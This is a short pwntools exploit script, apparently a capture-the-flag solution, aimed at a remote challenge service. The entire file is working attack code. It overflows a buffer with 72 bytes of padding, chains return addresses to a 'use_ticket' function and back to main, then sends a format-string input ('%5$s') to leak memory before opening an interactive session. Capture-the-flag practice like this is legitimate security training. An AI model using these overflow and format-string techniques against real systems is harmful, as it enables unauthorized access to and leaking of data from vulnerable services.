from pwn import *

elf = context.binary = ELF("chal")
context.terminal = ['tmux', 'split-window', '-h']
#p = elf.process()
p = remote('gold.b01le.rs', 4008)

gdb_script = '''
init-pwndbg
'''
#gdb.attach(p, gdb_script)

offset = 72
main_offset = 0x000000000040131f
ret = 0x000000000040101a
bruh = 0x00000000004012af
payload = flat([
    'a' * 64,
    'b' * 8,
    elf.symbols['use_ticket'],
    ret,
    main_offset
])

p.sendline(payload)
#p.sendlineafter(b'song?', "%1$p")
p.sendlineafter(b'song? ', b'%5$s')
p.interactive()


